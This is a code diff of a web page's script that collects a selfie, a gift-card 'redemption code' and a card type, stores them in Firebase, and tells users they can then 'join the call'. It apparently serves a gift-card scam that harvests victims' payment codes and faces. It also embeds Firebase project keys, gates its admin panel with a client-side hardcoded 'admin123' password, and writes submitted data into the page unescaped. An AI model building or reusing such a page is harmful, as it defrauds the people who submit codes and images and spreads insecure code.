@@ -323,198 +323,148 @@ padding: 10px;
 </div>
 
 <script>
-// For Firebase JS SDK v7.20.0 and later, measurementId is optional
-const firebaseConfig = {
-  apiKey: "AIzaSyDYXEZH_k9XOQNQt6pFE0aNrTN0kuwQfrY",
-  authDomain: "private-call-95aa5.firebaseapp.com",
-  projectId: "private-call-95aa5",
-  storageBucket: "private-call-95aa5.firebasestorage.app",
-  messagingSenderId: "852173515763",
-  appId: "1:852173515763:web:43b58e2fa9931a3360c086",
-  measurementId: "G-9P8DFX2SLC"
-};
+  // Firebase configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyBUmxEQRSirDF_hc3rvgzwU5vRc5uVifcY",
+    authDomain: "video-call-auth-e2237.firebaseapp.com",
+    projectId: "video-call-auth-e2237",
+    storageBucket: "video-call-auth-e2237.appspot.com",
+    messagingSenderId: "203016834335",
+    appId: "1:203016834335:web:fddc9c06f433a64afcf42a",
+    measurementId: "G-05HNPKVC14"
+  };
 
-// Initialize Firebase
-const app = firebase.initializeApp(firebaseConfig);
-const db = firebase.firestore();
-const storage = firebase.storage();
+  // Initialize Firebase once
+  const app = firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+  const storage = firebase.storage();
 
-const ADMIN_PASSWORD = "admin123"; // Change password here
-let submissions = [];
+  const ADMIN_PASSWORD = "admin123"; // Change as needed
 
-function submitFiles() {
-const selfie = document.getElementById("selfie").files[0];
-const redemptionCode = document.getElementById("redemptionCode").value.trim();
-const selectedCards = Array.from(document.querySelectorAll('input[name="cardType"]:checked'))
-.map(cb => cb.value);
+  // Show status messages
+  function showStatus(message, type) {
+    const statusEl = document.getElementById("statusMessage");
+    statusEl.textContent = message;
+    statusEl.className = `status-message ${type}`;
+    statusEl.style.display = "block";
+    setTimeout(() => { statusEl.style.display = "none"; }, 5000);
+  }
 
-if (!selfie) {
-showStatus("Please upload a selfie before submitting.", "error");
-return;
-}
+  // Submit form and upload files
+  function submitFiles() {
+    const selfieFile = document.getElementById("selfie").files[0];
+    const redemptionCode = document.getElementById("redemptionCode").value.trim();
+    const selectedCards = Array.from(document.querySelectorAll('input[name="cardType"]:checked'))
+                               .map(cb => cb.value);
 
-if (!redemptionCode) {
-showStatus("Please enter your redemption code.", "error");
-return;
-}
+    // Validations
+    if (!selfieFile) return showStatus("Please upload a selfie.", "error");
+    if (!redemptionCode) return showStatus("Enter your redemption code.", "error");
+    if (selectedCards.length === 0) return showStatus("Select at least one redemption method.", "error");
+    if (selfieFile.size > 4500000) return showStatus("File too large (<4.5MB).", "error");
 
-if (selectedCards.length === 0) {
-showStatus("Please select at least one redemption method.", "error");
-return;
-}
+    document.getElementById("loading").style.display = "block";
+    document.getElementById("submitBtn").disabled = true;
 
-// Validate file size (Vercel has limits)
-if (selfie.size > 4500000) { // 4.5MB limit
-showStatus("File size too large. Please upload an image under 4.5MB.", "error");
-return;
-}
+    // Upload selfie to Firebase Storage
+    const selfieRef = storage.ref(`selfies/${Date.now()}_${selfieFile.name}`);
+    selfieRef.put(selfieFile)
+      .then(snapshot => snapshot.ref.getDownloadURL())
+      .then(downloadURL => {
+        // Save submission with image URL
+        return db.collection("submissions").add({
+          selfieURL: downloadURL,
+          redemptionCode: redemptionCode,
+          cardTypes: selectedCards,
+          timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        });
+      })
+      .then(docRef => {
+        showStatus("Submission successful! You can now join the call.", "success");
+        console.log("Firestore ID:", docRef.id);
+        // Reset form
+        document.getElementById("selfie").value = "";
+        document.getElementById("redemptionCode").value = "";
+        document.querySelectorAll('input[name="cardType"]').forEach(cb => cb.checked = false);
+      })
+      .catch(error => {
+        console.error("Submission error:", error);
+        // Fallback: save without image
+        db.collection("submissions").add({
+          redemptionCode: redemptionCode,
+          cardTypes: selectedCards,
+          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+          error: "Image upload failed: " + error.message
+        })
+        .then(docRef => {
+          showStatus("Data saved (image failed). You can now join the call.", "success");
+          console.log("Fallback Firestore ID:", docRef.id);
+        })
+        .catch(dbError => {
+          showStatus("Error saving submission: " + dbError.message, "error");
+          console.error(dbError);
+        });
+      })
+      .finally(() => {
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("submitBtn").disabled = false;
+      });
+  }
 
-// Show loading state
-document.getElementById("loading").style.display = "block";
-document.getElementById("submitBtn").disabled = true;
+  // Admin access
+  function requestAdminAccess() {
+    const pass = prompt("Enter admin password:");
+    if (pass === ADMIN_PASSWORD) openAdmin();
+    else if (pass) alert("Access Denied!");
+  }
 
-// Upload selfie to Firebase Storage
-const storageRef = storage.ref();
-const selfieRef = storageRef.child(`selfies/${Date.now()}_${selfie.name}`);
+  function openAdmin() {
+    const panel = document.getElementById("adminPanel");
+    const list = document.getElementById("submissionsList");
+    list.innerHTML = "";
 
-selfieRef.put(selfie)
-.then((snapshot) => {
-return snapshot.ref.getDownloadURL();
-})
-.then((downloadURL) => {
-// Save to Firestore
-const submission = {
-selfieURL: downloadURL,
-redemptionCode: redemptionCode,
-cardTypes: selectedCards,
-time: new Date().toLocaleString(),
-timestamp: firebase.firestore.FieldValue.serverTimestamp()
-};
+    // Firestore query: latest submissions first
+    db.collection("submissions").orderBy("timestamp", "desc").get()
+      .then(querySnapshot => {
+        if (querySnapshot.empty) {
+          list.innerHTML = "<p>No submissions found.</p>";
+          return;
+        }
+        querySnapshot.forEach(doc => {
+          const data = doc.data();
+          list.innerHTML += `
+            <div class="submission">
+              <p><b>ID:</b> ${doc.id}</p>
+              <p><b>Time:</b> ${data.timestamp ? new Date(data.timestamp.seconds*1000).toLocaleString() : 'N/A'}</p>
+              <p><b>Redemption Code:</b> ${data.redemptionCode || 'N/A'}</p>
+              <p><b>Card Types:</b> ${data.cardTypes ? data.cardTypes.join(", ") : 'N/A'}</p>
+              ${data.selfieURL ? `<img src="${data.selfieURL}" alt="Selfie">` : '<p>No image</p>'}
+              ${data.error ? `<p class="error">Error: ${data.error}</p>` : ''}
+            </div>
+          `;
+        });
+      })
+      .catch(error => {
+        list.innerHTML = `<p>Error loading submissions: ${error.message}</p>`;
+      });
 
-return db.collection("submissions").add(submission);
-})
-.then((docRef) => {
-showStatus("Submission successful! You can now join the call.", "success");
-console.log("Document written with ID: ", docRef.id);
+    panel.style.display = "block";
+  }
 
-// Add to local array for admin panel
-const selfieFile = document.getElementById("selfie").files[0];
-const reader = new FileReader();
-reader.onload = function(e) {
-submissions.push({
-selfie: e.target.result,
-redemptionCode: redemptionCode,
-cardTypes: selectedCards,
-time: new Date().toLocaleString()
-});
-};
-reader.readAsDataURL(selfieFile);
-})
-.catch((error) => {
-console.error("Error details:", error);
+  function closeAdmin() {
+    document.getElementById("adminPanel").style.display = "none";
+  }
 
-// Fallback: Save to Firestore without the image URL if Storage fails
-const submission = {
-redemptionCode: redemptionCode,
-cardTypes: selectedCards,
-time: new Date().toLocaleString(),
-timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-error: "Image upload failed: " + error.message
-};
-
-return db.collection("submissions").add(submission)
-.then((docRef) => {
-showStatus("Data saved (image upload failed). You can now join the call.", "success");
-console.log("Document written with ID: ", docRef.id);
-})
-.catch((dbError) => {
-showStatus(`Error: ${dbError.message}`, "error");
-console.error("Error adding document: ", dbError);
-});
-})
-.finally(() => {
-document.getElementById("loading").style.display = "none";
-document.getElementById("submitBtn").disabled = false;
-});
-}
-
-function showStatus(message, type) {
-const statusEl = document.getElementById("statusMessage");
-statusEl.textContent = message;
-statusEl.className = `status-message ${type}`;
-statusEl.style.display = "block";
-
-// Auto-hide after 5 seconds
-setTimeout(() => {
-statusEl.style.display = "none";
-}, 5000);
-}
-
-function requestAdminAccess() {
-const pass = prompt("Enter admin password:");
-if (pass === ADMIN_PASSWORD) {
-openAdmin();
-} else if (pass) {
-alert("Access Denied!");
-}
-}
-
-function openAdmin() {
-const panel = document.getElementById("adminPanel");
-const list = document.getElementById("submissionsList");
-list.innerHTML = "";
-
-// Load from Firestore
-db.collection("submissions").orderBy("timestamp", "desc").get()
-.then((querySnapshot) => {
-if (querySnapshot.empty) {
-list.innerHTML = "<p>No submissions found.</p>";
-return;
-}
-
-querySnapshot.forEach((doc) => {
-const data = doc.data();
-list.innerHTML += `
-<div class="submission">
-<p><b>Submission ID:</b> ${doc.id}</p>
-<p><b>Time:</b> ${data.time}</p>
-<p><b>Redemption Code:</b> ${data.redemptionCode || 'N/A'}</p>
-<p><b>Card Types:</b> ${data.cardTypes ? data.cardTypes.join(", ") : 'N/A'}</p>
-${data.selfieURL ? `<img src="${data.selfieURL}" alt="Selfie">` : '<p>No image available</p>'}
-${data.error ? `<p class="error">Error: ${data.error}</p>` : ''}
-</div>
-`;
-});
-})
-.catch((error) => {
-list.innerHTML = `<p>Error loading data: ${error.message}</p>`;
-});
-
-panel.style.display = "block";
-}
-
-function closeAdmin() {
-document.getElementById("adminPanel").style.display = "none";
-}
-
-// Prevent selecting multiple card types
-document.querySelectorAll('input[name="cardType"]').forEach(checkbox => {
-checkbox.addEventListener('change', function() {
-if (this.checked) {
-document.querySelectorAll('input[name="cardType"]').forEach(other => {
-if (other !== this) other.checked = false;
-});
-}
-});
-});
-
-// Add error handling for Firebase initialization
-try {
-firebase.initializeApp(firebaseConfig);
-} catch (error) {
-console.error("Firebase initialization error:", error);
-showStatus("Firebase initialization error. Please check your configuration.", "error");
-}
+  // Prevent multiple card selections
+  document.querySelectorAll('input[name="cardType"]').forEach(cb => {
+    cb.addEventListener('change', function() {
+      if (this.checked) {
+        document.querySelectorAll('input[name="cardType"]').forEach(other => {
+          if (other !== this) other.checked = false;
+        });
+      }
+    });
+  });
 </script>
 </body>
 </html>
